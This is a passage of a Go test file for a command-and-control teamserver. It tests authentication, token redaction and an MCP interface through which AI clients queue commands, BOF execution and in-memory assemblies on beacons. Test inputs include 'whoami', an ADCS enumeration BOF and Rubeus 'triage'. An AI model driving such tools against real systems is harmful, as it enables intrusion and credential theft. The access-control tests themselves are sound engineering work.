package server

import (
	"bytes"
	"context"
	"crypto/rand"
	"crypto/rsa"
	"crypto/sha256"
	"database/sql"
	"encoding/base64"
	"encoding/binary"
	"encoding/json"
	"encoding/pem"
	"errors"
	"fmt"
	"io"
	"mime/multipart"
	"net"
	"net/http"
	"net/http/httptest"
	"os"
	"path/filepath"
	"reflect"
	"strings"
	"testing"
	"time"

	"c2/auth"
	"c2/models"
	"c2/protocol"
	"c2/store"
)

// noopLM is a no-op listenerStarter for unit tests.
type noopLM struct{}

func (n *noopLM) Start(l *models.Listener, h http.Handler) error { return nil }
func (n *noopLM) Stop(id uint32) error                           { return nil }

type nopPersister struct{}

func (n *nopPersister) SaveListeners(_ []*models.Listener)               {}
func (n *nopPersister) SaveBeacons(_ []*models.Beacon)                   {}
func (n *nopPersister) SaveEvents(_ []*models.Event)                     {}
func (n *nopPersister) SaveTerminals(_ map[uint32]*models.TerminalState) {}
func (n *nopPersister) SaveLoot(_ []*models.ExfilEntry)                  {}
func (n *nopPersister) SaveRSAKey(_ *rsa.PrivateKey)                     {}

func newTestStore(t *testing.T) *store.Store {
	t.Helper()
	s, err := store.New(filepath.Join(t.TempDir(), "test.db"))
	if err != nil {
		t.Fatalf("store.New: %v", err)
	}
	t.Cleanup(func() { s.Close() })
	return s
}

func newTestStoreWithPath(t *testing.T) (*store.Store, string) {
	t.Helper()
	dbPath := filepath.Join(t.TempDir(), "test.db")
	s, err := store.New(dbPath)
	if err != nil {
		t.Fatalf("store.New: %v", err)
	}
	t.Cleanup(func() { s.Close() })
	return s, dbPath
}

func setup(t *testing.T) (*Handler, *store.Store, *rsa.PrivateKey) {
	t.Helper()
	priv, err := protocol.GenerateRSAKey()
	if err != nil {
		t.Fatalf("RSA keygen: %v", err)
	}
	s := newTestStore(t)
	return NewHandler(s, priv, "", &noopLM{}, &nopPersister{}, 0, nil, NewHub(), nil, nil, []byte("01234567890123456789012345678901")), s, priv
}

func mcpTestBearer(secret string) string {
	return "Bearer " + makeMCPOperatorToken(secret, "operator")
}

func TestAuthMiddlewareRejectsMCPTokenForManagementRoutes(t *testing.T) {
	t.Setenv("BEBOP_MCP_TOKEN", "test-mcp-token")
	t.Setenv("BEBOP_MCP_ALLOW_MUTATION", "1")

	s, err := store.New(t.TempDir() + "/store.db")
	if err != nil {
		t.Fatalf("store.New: %v", err)
	}
	defer s.Close()
	h := NewHandler(s, nil, "", &noopLM{}, &nopPersister{}, 8080, nil, NewHub(), nil, nil, []byte("01234567890123456789012345678901"))

	next := h.authMiddleware(func(w http.ResponseWriter, r *http.Request) {
		t.Fatal("handler should not run")
	})

	req := httptest.NewRequest(http.MethodGet, "/api/sessions", nil)
	req.Header.Set("Authorization", "Bearer test-mcp-token")
	w := httptest.NewRecorder()
	next(w, req)

	if w.Code != http.StatusUnauthorized {
		t.Fatalf("status = %d, want %d", w.Code, http.StatusUnauthorized)
	}
}

func TestAuthMiddlewareAcceptsJWTForManagementRoutes(t *testing.T) {
	t.Setenv("BEBOP_MCP_TOKEN", "test-mcp-token")

	s, err := store.New(t.TempDir() + "/store.db")
	if err != nil {
		t.Fatalf("store.New: %v", err)
	}
	defer s.Close()
	jwtKey := []byte("01234567890123456789012345678901")
	h := NewHandler(s, nil, "", &noopLM{}, &nopPersister{}, 8080, nil, NewHub(), nil, nil, jwtKey)
	token, err := auth.SignToken("operator", jwtKey)
	if err != nil {
		t.Fatalf("SignToken: %v", err)
	}

	var gotOperator string
	next := h.authMiddleware(func(w http.ResponseWriter, r *http.Request) {
		gotOperator, _ = r.Context().Value(operatorKey).(string)
		w.WriteHeader(http.StatusNoContent)
	})

	req := httptest.NewRequest(http.MethodGet, "/api/test", nil)
	req.Header.Set("Authorization", "Bearer "+token)
	w := httptest.NewRecorder()
	next(w, req)

	if w.Code != http.StatusNoContent {
		t.Fatalf("status = %d body = %q", w.Code, w.Body.String())
	}
	if gotOperator != "operator" {
		t.Fatalf("operator = %q, want operator", gotOperator)
	}
}

func TestMCPHTTPAuthMiddlewareRejectsRawSigningSecret(t *testing.T) {
	t.Setenv("BEBOP_MCP_TOKEN", "token=test-mcp-token\noperator=alice")

	s, err := store.New(t.TempDir() + "/store.db")
	if err != nil {
		t.Fatalf("store.New: %v", err)
	}
	defer s.Close()
	h := NewHandler(s, nil, "", &noopLM{}, &nopPersister{}, 8080, nil, NewHub(), nil, nil, []byte("01234567890123456789012345678901"))

	next := h.mcpHTTPAuthMiddleware(func(w http.ResponseWriter, r *http.Request) {
		t.Fatal("handler should not run")
	})

	req := httptest.NewRequest(http.MethodPost, "/api/mcp", nil)
	req.Header.Set("Authorization", "Bearer test-mcp-token")
	w := httptest.NewRecorder()
	next(w, req)

	if w.Code != http.StatusUnauthorized {
		t.Fatalf("status = %d body = %q, want unauthorized", w.Code, w.Body.String())
	}
}

func TestMCPHTTPAuthMiddlewareAcceptsOperatorBoundMCPToken(t *testing.T) {
	t.Setenv("BEBOP_MCP_TOKEN", "test-mcp-token")

	s, err := store.New(t.TempDir() + "/store.db")
	if err != nil {
		t.Fatalf("store.New: %v", err)
	}
	defer s.Close()
	h := NewHandler(s, nil, "", &noopLM{}, &nopPersister{}, 8080, nil, NewHub(), nil, nil, []byte("01234567890123456789012345678901"))

	bound := makeMCPOperatorToken("test-mcp-token", "alice")
	var gotOperator string
	next := h.mcpHTTPAuthMiddleware(func(w http.ResponseWriter, r *http.Request) {
		gotOperator, _ = r.Context().Value(operatorKey).(string)
		w.WriteHeader(http.StatusNoContent)
	})

	req := httptest.NewRequest(http.MethodPost, "/api/mcp", nil)
	req.Header.Set("Authorization", "Bearer "+bound)
	w := httptest.NewRecorder()
	next(w, req)

	if w.Code != http.StatusNoContent {
		t.Fatalf("status = %d body = %q", w.Code, w.Body.String())
	}
	if gotOperator != "alice" {
		t.Fatalf("operator = %q, want alice", gotOperator)
	}
	internal, err := h.mcpInternalBearer(bound)
	if err != nil {
		t.Fatalf("mcpInternalBearer: %v", err)
	}
	username, err := auth.ValidateToken(internal, h.jwtKey)
	if err != nil {
		t.Fatalf("ValidateToken: %v", err)
	}
	if username != "alice" {
		t.Fatalf("internal token username = %q, want alice", username)
	}
}

func TestMCPHTTPAuthMiddlewareRejectsDeletedOperator(t *testing.T) {
	t.Setenv("BEBOP_MCP_TOKEN", "test-mcp-token")

	authSvc, err := auth.New(filepath.Join(t.TempDir(), "operators.db"))
	if err != nil {
		t.Fatalf("auth.New: %v", err)
	}
	t.Cleanup(func() { _ = authSvc.Close() })
	if err := authSvc.CreateOperator("alice", "pass"); err != nil {
		t.Fatalf("CreateOperator: %v", err)
	}
	bound := makeMCPOperatorToken("test-mcp-token", "alice")
	if err := authSvc.DeleteOperator("alice"); err != nil {
		t.Fatalf("DeleteOperator: %v", err)
	}

	s := newTestStore(t)
	h := NewHandler(s, nil, "", &noopLM{}, &nopPersister{}, 8080, nil, NewHub(), nil, authSvc, []byte("01234567890123456789012345678901"))
	next := h.mcpHTTPAuthMiddleware(func(w http.ResponseWriter, r *http.Request) {
		t.Fatal("handler should not run")
	})

	req := httptest.NewRequest(http.MethodPost, "/api/mcp", nil)
	req.Header.Set("Authorization", "Bearer "+bound)
	w := httptest.NewRecorder()
	next(w, req)

	if w.Code != http.StatusUnauthorized {
		t.Fatalf("status = %d body = %q, want unauthorized", w.Code, w.Body.String())
	}
}

func TestMCPHTTPAuthMiddlewareRejectsTamperedOperatorToken(t *testing.T) {
	t.Setenv("BEBOP_MCP_TOKEN", "test-mcp-token")

	s, err := store.New(t.TempDir() + "/store.db")
	if err != nil {
		t.Fatalf("store.New: %v", err)
	}
	defer s.Close()
	h := NewHandler(s, nil, "", &noopLM{}, &nopPersister{}, 8080, nil, NewHub(), nil, nil, []byte("01234567890123456789012345678901"))

	token := makeMCPOperatorToken("test-mcp-token", "alice")
	parts := strings.Split(token, ".")
	if len(parts) < 4 {
		t.Fatalf("token parts = %d, want at least 4", len(parts))
	}
	parts[1] = base64.RawURLEncoding.EncodeToString([]byte("bob"))
	tampered := strings.Join(parts, ".")

	next := h.mcpHTTPAuthMiddleware(func(w http.ResponseWriter, r *http.Request) {
		t.Fatal("handler should not run")
	})
	req := httptest.NewRequest(http.MethodPost, "/api/mcp", nil)
	req.Header.Set("Authorization", "Bearer "+tampered)
	w := httptest.NewRecorder()
	next(w, req)

	if w.Code != http.StatusUnauthorized {
		t.Fatalf("status = %d body = %q, want unauthorized", w.Code, w.Body.String())
	}
}

func TestMCPHTTPAuthMiddlewareRejectsWrongMCPToken(t *testing.T) {
	t.Setenv("BEBOP_MCP_TOKEN", "test-mcp-token")

	s, err := store.New(t.TempDir() + "/store.db")
	if err != nil {
		t.Fatalf("store.New: %v", err)
	}
	defer s.Close()
	h := NewHandler(s, nil, "", &noopLM{}, &nopPersister{}, 8080, nil, NewHub(), nil, nil, []byte("01234567890123456789012345678901"))

	next := h.mcpHTTPAuthMiddleware(func(w http.ResponseWriter, r *http.Request) {
		t.Fatal("handler should not run")
	})

	req := httptest.NewRequest(http.MethodPost, "/api/mcp", nil)
	req.Header.Set("Authorization", "Bearer wrong-token")
	w := httptest.NewRecorder()
	next(w, req)

	if w.Code != http.StatusUnauthorized {
		t.Fatalf("status = %d, want %d", w.Code, http.StatusUnauthorized)
	}
}

func TestHandleMCPStatusDoesNotLeakToken(t *testing.T) {
	t.Setenv("BEBOP_MCP_TOKEN", "token=super-secret-mcp-token\noperator=operator")
	t.Setenv("BEBOP_MCP_ALLOW_MUTATION", "")

	h, _, _ := setup(t)
	h.managementPort = 8088
	token, err := auth.SignToken("operator", h.jwtKey)
	if err != nil {
		t.Fatalf("SignToken: %v", err)
	}

	req := httptest.NewRequest(http.MethodGet, "/api/mcp/status", nil)
	req.Header.Set("Authorization", "Bearer "+token)
	req.Host = "team.example:8088"
	req.Header.Set("X-Forwarded-Proto", "https")
	w := httptest.NewRecorder()

	h.authMiddleware(h.HandleMCPStatus)(w, req)

	if w.Code != http.StatusOK {
		t.Fatalf("status = %d body = %q", w.Code, w.Body.String())
	}
	if contentType := w.Header().Get("Content-Type"); contentType != "application/json" {
		t.Fatalf("Content-Type = %q, want application/json", contentType)
	}
	if strings.Contains(w.Body.String(), "super-secret-mcp-token") {
		t.Fatal("response leaked MCP token")
	}

	var got struct {
		Mode            string   `json:"mode"`
		Endpoint        string   `json:"endpoint"`
		TeamserverURL   string   `json:"teamserver_url"`
		TokenConfigured bool     `json:"token_configured"`
		MutationDefault bool     `json:"mutation_default"`
		ToolsReadonly   []string `json:"tools_readonly"`
		ToolsMutating   []string `json:"tools_mutating"`
		Resources       []string `json:"resources"`
	}
	if err := json.NewDecoder(w.Body).Decode(&got); err != nil {
		t.Fatalf("decode response: %v", err)
	}
	if got.Mode != "http" {
		t.Fatalf("mode = %q, want http", got.Mode)
	}
	if got.Endpoint != "https://team.example:8088/api/mcp" {
		t.Fatalf("endpoint = %q", got.Endpoint)
	}
	if got.TeamserverURL != "https://team.example:8088" {
		t.Fatalf("teamserver_url = %q", got.TeamserverURL)
	}
	if !got.TokenConfigured {
		t.Fatal("token_configured = false, want true")
	}
	if !got.MutationDefault {
		t.Fatal("mutation_default = false, want true")
	}

	for _, tool := range []string{
		"sessions.list",
		"session.get",
		"results.list",
		"events.list",
		"loot.list",
		"library.list",
	} {
		if !containsString(got.ToolsReadonly, tool) {
			t.Fatalf("tools_readonly missing %q", tool)
		}
	}
	for _, tool := range []string{
		"command.run",
		"bof.execute",
		"inline-assembly.execute",
		"session.close",
		"beacon.sleep",
		"beacon.exit",
		"beacon.interactive",
		"socks.start",
		"socks.stop",
	} {
		if !containsString(got.ToolsMutating, tool) {
			t.Fatalf("tools_mutating missing %q", tool)
		}
	}
	for _, resource := range []string{
		"bebop://sessions",
		"bebop://sessions/{id}",
		"bebop://results/{id}",
		"bebop://events",
		"bebop://loot",
		"bebop://library",
	} {
		if !containsString(got.Resources, resource) {
			t.Fatalf("resources missing %q", resource)
		}
	}
}

func TestHandleMCPStatusReportsMutationEnabled(t *testing.T) {
	t.Setenv("BEBOP_MCP_TOKEN", "token=super-secret-mcp-token\noperator=operator")
	t.Setenv("BEBOP_MCP_ALLOW_MUTATION", "1")

	h, _, _ := setup(t)
	token, err := auth.SignToken("operator", h.jwtKey)
	if err != nil {
		t.Fatalf("SignToken: %v", err)
	}
	req := httptest.NewRequest(http.MethodGet, "/api/mcp/status", nil)
	req.Header.Set("Authorization", "Bearer "+token)
	w := httptest.NewRecorder()

	h.authMiddleware(h.HandleMCPStatus)(w, req)

	if w.Code != http.StatusOK {
		t.Fatalf("status = %d body = %q", w.Code, w.Body.String())
	}
	var got struct {
		MutationDefault bool `json:"mutation_default"`
	}
	if err := json.NewDecoder(w.Body).Decode(&got); err != nil {
		t.Fatalf("decode response: %v", err)
	}
	if !got.MutationDefault {
		t.Fatal("mutation_default = false, want true")
	}
}

func TestHandleMCPStatusReportsMutationDisabledWhenExplicit(t *testing.T) {
	t.Setenv("BEBOP_MCP_TOKEN", "token=super-secret-mcp-token\noperator=operator")
	t.Setenv("BEBOP_MCP_ALLOW_MUTATION", "0")

	h, _, _ := setup(t)
	token, err := auth.SignToken("operator", h.jwtKey)
	if err != nil {
		t.Fatalf("SignToken: %v", err)
	}
	req := httptest.NewRequest(http.MethodGet, "/api/mcp/status", nil)
	req.Header.Set("Authorization", "Bearer "+token)
	w := httptest.NewRecorder()

	h.authMiddleware(h.HandleMCPStatus)(w, req)

	if w.Code != http.StatusOK {
		t.Fatalf("status = %d body = %q", w.Code, w.Body.String())
	}
	var got struct {
		MutationDefault bool `json:"mutation_default"`
	}
	if err := json.NewDecoder(w.Body).Decode(&got); err != nil {
		t.Fatalf("decode response: %v", err)
	}
	if got.MutationDefault {
		t.Fatal("mutation_default = true, want false")
	}
}

func TestHandleMCPTokenRevealsTokenWhenAuthenticated(t *testing.T) {
	t.Setenv("BEBOP_MCP_TOKEN", "token=super-secret-mcp-token\noperator=bob")

	h, _, _ := setup(t)
	token, err := auth.SignToken("alice", h.jwtKey)
	if err != nil {
		t.Fatalf("SignToken: %v", err)
	}

	req := httptest.NewRequest(http.MethodGet, "/api/mcp/token", nil)
	req.Header.Set("Authorization", "Bearer "+token)
	w := httptest.NewRecorder()

	h.authMiddleware(h.HandleMCPToken)(w, req)

	if w.Code != http.StatusOK {
		t.Fatalf("status = %d body = %q", w.Code, w.Body.String())
	}
	if contentType := w.Header().Get("Content-Type"); contentType != "application/json" {
		t.Fatalf("Content-Type = %q, want application/json", contentType)
	}
	var got struct {
		Token    string `json:"token"`
		Operator string `json:"operator"`
	}
	if err := json.NewDecoder(w.Body).Decode(&got); err != nil {
		t.Fatalf("decode response: %v", err)
	}
	if got.Token == "super-secret-mcp-token" {
		t.Fatal("token leaked raw MCP secret")
	}
	if got.Operator != "alice" {
		t.Fatalf("response operator = %q, want alice", got.Operator)
	}
	authCtx, ok := validateMCPToken(got.Token)
	if !ok {
		t.Fatalf("returned token did not validate: %q", got.Token)
	}
	if authCtx.Operator != "alice" {
		t.Fatalf("operator = %q, want alice", authCtx.Operator)
	}
	events := h.store.ListEvents()
	if len(events) != 1 ||
		!strings.Contains(events[0].Message, "operator 'alice' revealed MCP token") {
		t.Fatalf("missing MCP token reveal event: %#v", events)
	}
}

func TestHandleMCPTokenReturnsNotFoundWhenUnset(t *testing.T) {
	t.Setenv("BEBOP_MCP_TOKEN", "")
	t.Setenv("HOME", t.TempDir())

	h, _, _ := setup(t)
	token, err := auth.SignToken("operator", h.jwtKey)
	if err != nil {
		t.Fatalf("SignToken: %v", err)
	}

	req := httptest.NewRequest(http.MethodGet, "/api/mcp/token", nil)
	req.Header.Set("Authorization", "Bearer "+token)
	w := httptest.NewRecorder()

	h.authMiddleware(h.HandleMCPToken)(w, req)

	if w.Code != http.StatusNotFound {
		t.Fatalf("status = %d body = %q", w.Code, w.Body.String())
	}
}

func TestHandleMCPTokenReadsDefaultTokenFile(t *testing.T) {
	t.Setenv("BEBOP_MCP_TOKEN", "")
	home := t.TempDir()
	t.Setenv("HOME", home)
	if err := os.MkdirAll(filepath.Join(home, ".bebop"), 0o700); err != nil {
		t.Fatalf("MkdirAll: %v", err)
	}
	if err := os.WriteFile(filepath.Join(home, ".bebop", "mcp.token"), []byte("file-backed-token\n"), 0o600); err != nil {
		t.Fatalf("WriteFile: %v", err)
	}

	h, _, _ := setup(t)
	token, err := auth.SignToken("operator", h.jwtKey)
	if err != nil {
		t.Fatalf("SignToken: %v", err)
	}

	req := httptest.NewRequest(http.MethodGet, "/api/mcp/token", nil)
	req.Header.Set("Authorization", "Bearer "+token)
	w := httptest.NewRecorder()

	h.authMiddleware(h.HandleMCPToken)(w, req)

	if w.Code != http.StatusOK {
		t.Fatalf("status = %d body = %q", w.Code, w.Body.String())
	}
	var got struct {
		Token string `json:"token"`
	}
	if err := json.NewDecoder(w.Body).Decode(&got); err != nil {
		t.Fatalf("decode response: %v", err)
	}
	authCtx, ok := validateMCPToken(got.Token)
	if !ok {
		t.Fatalf("returned token did not validate: %q", got.Token)
	}
	if authCtx.Operator != "operator" {
		t.Fatalf("operator = %q, want operator", authCtx.Operator)
	}
}

func TestRedactEventArgsHandlesQuotedSecrets(t *testing.T) {
	got := redactEventArgs(`run --user alice --password "foo bar" --token=abc123 Authorization: Bearer secret-value`)
	for _, leaked := range []string{"foo", "bar", "abc123", "secret-value"} {
		if strings.Contains(got, leaked) {
			t.Fatalf("redacted args leaked %q in %q", leaked, got)
		}
	}
	if !strings.Contains(got, "--password [redacted]") ||
		!strings.Contains(got, "--token=[redacted]") ||
		!strings.Contains(got, "Authorization: [redacted] [redacted]") {
		t.Fatalf("unexpected redaction output: %q", got)
	}
}

func TestHandleMCPRPCInitialize(t *testing.T) {
	t.Setenv("BEBOP_MCP_TOKEN", "token=super-secret-mcp-token\noperator=operator")

	h, _, _ := setup(t)
	req := httptest.NewRequest(http.MethodPost, "/api/mcp", strings.NewReader(`{"jsonrpc":"2.0","id":1,"method":"initialize"}`))
	req.Header.Set("Authorization", mcpTestBearer("super-secret-mcp-token"))
	w := httptest.NewRecorder()

	h.mcpHTTPAuthMiddleware(h.HandleMCPRPC)(w, req)

	if w.Code != http.StatusOK {
		t.Fatalf("status = %d body = %q", w.Code, w.Body.String())
	}
	var got struct {
		Error  *mcpRPCError `json:"error"`
		Result struct {
			ProtocolVersion string `json:"protocolVersion"`
			ServerInfo      struct {
				Name string `json:"name"`
			} `json:"serverInfo"`
		} `json:"result"`
	}
	if err := json.NewDecoder(w.Body).Decode(&got); err != nil {
		t.Fatalf("decode response: %v", err)
	}
	if got.Error != nil {
		t.Fatalf("unexpected error: %+v", got.Error)
	}
	if got.Result.ProtocolVersion == "" {
		t.Fatal("protocolVersion empty")
	}
	if got.Result.ServerInfo.Name != "bebop-http-mcp" {
		t.Fatalf("server name = %q", got.Result.ServerInfo.Name)
	}
	if got := w.Header().Get("MCP-Protocol-Version"); got != mcpProtocolVersion {
		t.Fatalf("MCP-Protocol-Version = %q", got)
	}
}

func TestHandleMCPStreamOpensSSE(t *testing.T) {
	t.Setenv("BEBOP_MCP_TOKEN", "token=super-secret-mcp-token\noperator=operator")

	h, _, _ := setup(t)
	ctx, cancel := context.WithCancel(context.Background())
	cancel()
	req := httptest.NewRequest(http.MethodGet, "/api/mcp", nil).WithContext(ctx)
	req.Header.Set("Authorization", mcpTestBearer("super-secret-mcp-token"))
	w := httptest.NewRecorder()

	h.mcpHTTPAuthMiddleware(h.HandleMCPStream)(w, req)

	if w.Code != http.StatusOK {
		t.Fatalf("status = %d body = %q", w.Code, w.Body.String())
	}
	if got := w.Header().Get("Content-Type"); got != "text/event-stream" {
		t.Fatalf("content-type = %q", got)
	}
	if got := w.Header().Get("MCP-Protocol-Version"); got != mcpProtocolVersion {
		t.Fatalf("MCP-Protocol-Version = %q", got)
	}
	if !strings.Contains(w.Body.String(), "bebop mcp stream") {
		t.Fatalf("stream prelude missing: %q", w.Body.String())
	}
}

func TestHandleMCPStreamEmitsHubEvents(t *testing.T) {
	t.Setenv("BEBOP_MCP_TOKEN", "token=super-secret-mcp-token\noperator=operator")
	h, _, _ := setup(t)
	ctx, cancel := context.WithCancel(context.Background())
	req := httptest.NewRequest(http.MethodGet, "/api/mcp", nil).WithContext(ctx)
	req.Header.Set("Authorization", mcpTestBearer("super-secret-mcp-token"))
	w := httptest.NewRecorder()
	done := make(chan struct{})
	go func() {
		h.mcpHTTPAuthMiddleware(h.HandleMCPStream)(w, req)
		close(done)
	}()

	for i := 0; i < 20; i++ {
		h.hub.mu.RLock()
		subs := len(h.hub.subs)
		h.hub.mu.RUnlock()
		if subs > 0 {
			break
		}
		time.Sleep(10 * time.Millisecond)
	}
	h.hub.Publish("events", "add", map[string]any{"message": "hello"})
	time.Sleep(50 * time.Millisecond)
	cancel()
	<-done

	body := w.Body.String()
	if !strings.Contains(body, "event: message") || !strings.Contains(body, "hello") {
		t.Fatalf("stream body = %q", body)
	}
}

func TestHandleMCPStreamRejectsWhenSlotsFull(t *testing.T) {
	t.Setenv("BEBOP_MCP_TOKEN", "token=super-secret-mcp-token\noperator=operator")
	acquired := 0
	for i := 0; i < mcpMaxStreams; i++ {
		if !mcpAcquireStream() {
			t.Fatalf("acquire stream slot %d failed", i)
		}
		acquired++
	}
	defer func() {
		for i := 0; i < acquired; i++ {
			mcpReleaseStream()
		}
	}()

	h, _, _ := setup(t)
	req := httptest.NewRequest(http.MethodGet, "/api/mcp", nil)
	req.Header.Set("Authorization", mcpTestBearer("super-secret-mcp-token"))
	w := httptest.NewRecorder()

	h.mcpHTTPAuthMiddleware(h.HandleMCPStream)(w, req)

	if w.Code != http.StatusTooManyRequests {
		t.Fatalf("status = %d body = %q", w.Code, w.Body.String())
	}
}

func TestHandleMCPRPCToolsListUsesToolLevelMutationGate(t *testing.T) {
	t.Setenv("BEBOP_MCP_TOKEN", "token=super-secret-mcp-token\noperator=operator")
	t.Setenv("BEBOP_MCP_ALLOW_MUTATION", "0")

	h, _, _ := setup(t)
	req := httptest.NewRequest(http.MethodPost, "/api/mcp", strings.NewReader(`{"jsonrpc":"2.0","id":1,"method":"tools/list"}`))
	req.Header.Set("Authorization", mcpTestBearer("super-secret-mcp-token"))
	w := httptest.NewRecorder()

	h.mcpHTTPAuthMiddleware(h.HandleMCPRPC)(w, req)

	if w.Code != http.StatusOK {
		t.Fatalf("status = %d body = %q", w.Code, w.Body.String())
	}
	var got struct {
		Error  *mcpRPCError `json:"error"`
		Result struct {
			Tools []struct {
				Name string `json:"name"`
			} `json:"tools"`
		} `json:"result"`
	}
	if err := json.NewDecoder(w.Body).Decode(&got); err != nil {
		t.Fatalf("decode response: %v", err)
	}
	if got.Error != nil {
		t.Fatalf("unexpected error: %+v", got.Error)
	}
	names := make([]string, 0, len(got.Result.Tools))
	for _, tool := range got.Result.Tools {
		names = append(names, tool.Name)
	}
	if !containsString(names, "sessions.list") {
		t.Fatal("read-only tool missing")
	}
	if containsString(names, "command.run") {
		t.Fatal("mutating tool exposed while mutation disabled")
	}
}

func TestHandleMCPRPCToolsListShowsMutatingWhenEnabled(t *testing.T) {
	t.Setenv("BEBOP_MCP_TOKEN", "token=super-secret-mcp-token\noperator=operator")
	t.Setenv("BEBOP_MCP_ALLOW_MUTATION", "1")

	h, _, _ := setup(t)
	req := httptest.NewRequest(http.MethodPost, "/api/mcp", strings.NewReader(`{"jsonrpc":"2.0","id":1,"method":"tools/list"}`))
	req.Header.Set("Authorization", mcpTestBearer("super-secret-mcp-token"))
	w := httptest.NewRecorder()

	h.mcpHTTPAuthMiddleware(h.HandleMCPRPC)(w, req)

	if w.Code != http.StatusOK {
		t.Fatalf("status = %d body = %q", w.Code, w.Body.String())
	}
	var got struct {
		Result struct {
			Tools []struct {
				Name string `json:"name"`
			} `json:"tools"`
		} `json:"result"`
	}
	if err := json.NewDecoder(w.Body).Decode(&got); err != nil {
		t.Fatalf("decode response: %v", err)
	}
	names := make([]string, 0, len(got.Result.Tools))
	for _, tool := range got.Result.Tools {
		names = append(names, tool.Name)
	}
	if !containsString(names, "command.run") {
		t.Fatal("mutating tool missing when mutation enabled")
	}
}

func TestMCPHTTPCallToolRejectsMutationWhenDisabled(t *testing.T) {
	srv := newMCPHTTPServer(newMCPTeamserverClient("http://127.0.0.1:1", ""), false)

	_, err := srv.callTool(json.RawMessage(`{"name":"command.run","arguments":{"beacon_id":1,"command":"whoami"}}`))
	if err == nil || !strings.Contains(err.Error(), "mutation disabled") {
		t.Fatalf("err = %v, want mutation disabled", err)
	}
}

func TestMCPHTTPCallCommandRunPostsStructuredArgs(t *testing.T) {
	var got map[string]interface{}
	ts := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		if r.URL.Path != "/api/task" {
			t.Fatalf("path = %q", r.URL.Path)
		}
		if r.Method != http.MethodPost {
			t.Fatalf("method = %q", r.Method)
		}
		if err := json.NewDecoder(r.Body).Decode(&got); err != nil {
			t.Fatalf("decode request: %v", err)
		}
		w.Header().Set("Content-Type", "application/json")
		json.NewEncoder(w).Encode(map[string]interface{}{"queued": true})
	}))
	defer ts.Close()

	srv := newMCPHTTPServer(newMCPTeamserverClient(ts.URL, ""), true)
	_, err := srv.callTool(json.RawMessage(`{"name":"command.run","arguments":{"beacon_id":7,"command":"run","args":["hello world","quote\"me"],"transport":"http"}}`))
	if err != nil {
		t.Fatalf("callTool: %v", err)
	}
	if got["beacon_id"] != float64(7) {
		t.Fatalf("beacon_id = %#v", got["beacon_id"])
	}
	if got["transport"] != "http" {
		t.Fatalf("transport = %#v", got["transport"])
	}
	args, _ := got["args"].(string)
	if !strings.Contains(args, `"hello world"`) || !strings.Contains(args, `quote\"me`) {
		t.Fatalf("args = %q", args)
	}
}

func TestMCPHTTPCallBOFAndInlineAssemblyUseMultipart(t *testing.T) {
	seen := make(map[string]map[string]string)
	ts := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		if err := r.ParseMultipartForm(1 << 20); err != nil {
			t.Fatalf("ParseMultipartForm: %v", err)
		}
		seen[r.URL.Path] = map[string]string{
			"beacon_id":     r.FormValue("beacon_id"),
			"object_name":   r.FormValue("object_name"),
			"assembly_name": r.FormValue("assembly_name"),
			"args":          r.FormValue("args"),
			"mode":          r.FormValue("mode"),
		}
		w.Header().Set("Content-Type", "application/json")
		json.NewEncoder(w).Encode(map[string]interface{}{"queued": true})
	}))
	defer ts.Close()

	srv := newMCPHTTPServer(newMCPTeamserverClient(ts.URL, ""), true)
	if _, err := srv.callTool(json.RawMessage(`{"name":"bof.execute","arguments":{"beacon_id":9,"object_name":"adcs_enum.x64.o","args":["/domain:support.htb"]}}`)); err != nil {
		t.Fatalf("bof callTool: %v", err)
	}
	if _, err := srv.callTool(json.RawMessage(`{"name":"inline-assembly.execute","arguments":{"beacon_id":9,"assembly_name":"Rubeus.exe","args":["triage"],"mode":"bridge"}}`)); err != nil {
		t.Fatalf("inline callTool: %v", err)
	}

	if seen["/api/bof"]["object_name"] != "adcs_enum.x64.o" || seen["/api/bof"]["args"] != "/domain:support.htb" {
		t.Fatalf("bof form = %#v", seen["/api/bof"])
	}
	if seen["/api/inline-assembly"]["assembly_name"] != "Rubeus.exe" || seen["/api/inline-assembly"]["mode"] != "bridge" {
		t.Fatalf("inline form = %#v", seen["/api/inline-assembly"])
	}
}

func TestMCPHTTPReadResourceEvents(t *testing.T) {
	ts := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		if r.URL.Path != "/api/events" {
			t.Fatalf("path = %q", r.URL.Path)
		}
		w.Header().Set("Content-Type", "application/json")
		json.NewEncoder(w).Encode([]map[string]interface{}{{"type": "test", "message": "ok"}})
	}))
	defer ts.Close()

	srv := newMCPHTTPServer(newMCPTeamserverClient(ts.URL, ""), false)
	result, err := srv.readResource(json.RawMessage(`{"uri":"bebop://events"}`))
	if err != nil {
		t.Fatalf("readResource: %v", err)
	}
	contents, ok := result["contents"].([]map[string]interface{})
	if !ok || len(contents) != 1 {
		t.Fatalf("contents = %#v", result["contents"])
	}
	if !strings.Contains(contents[0]["text"].(string), `"message": "ok"`) {
		t.Fatalf("text = %q", contents[0]["text"])
	}
}

func TestHandlePostEventBindsAuthenticatedOperator(t *testing.T) {
	h, st, _ := setup(t)
	req := httptest.NewRequest(http.MethodPost, "/api/events", strings.NewReader(`{"type":"mcp","message":"operator 'bob' queued fake task"}`))
	req = req.WithContext(context.WithValue(req.Context(), operatorKey, "alice"))
	w := httptest.NewRecorder()

	h.HandlePostEvent(w, req)

	if w.Code != http.StatusOK {
		t.Fatalf("status = %d body = %q", w.Code, w.Body.String())
	}
	var got models.Event
	if err := json.NewDecoder(w.Body).Decode(&got); err != nil {
		t.Fatalf("decode response: %v", err)
	}
	if !strings.HasPrefix(got.Message, "operator 'alice' ") {
		t.Fatalf("message = %q, want authenticated operator prefix", got.Message)
	}
	events := st.ListEvents()
	if len(events) != 1 || events[0].Message != got.Message {
		t.Fatalf("stored events = %#v, response = %#v", events, got)
	}
}

func newMCPToolTestServer(t *testing.T, allowMutation bool) (*mcpHTTPServer, *store.Store) {
	t.Helper()
	st := newTestStore(t)
	ts := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		h := NewHandler(st, nil, "", &noopLM{}, &nopPersister{}, 8080, nil, NewHub(), nil, nil, []byte("01234567890123456789012345678901"))
		switch {
		case r.Method == http.MethodGet && strings.HasPrefix(r.URL.Path, "/api/results/"):
			r.SetPathValue("id", strings.TrimPrefix(r.URL.Path, "/api/results/"))
			h.HandleGetResults(w, r)
		case r.Method == http.MethodPost && r.URL.Path == "/api/task":
			h.HandleQueueTask(w, r)
		default:
			http.NotFound(w, r)
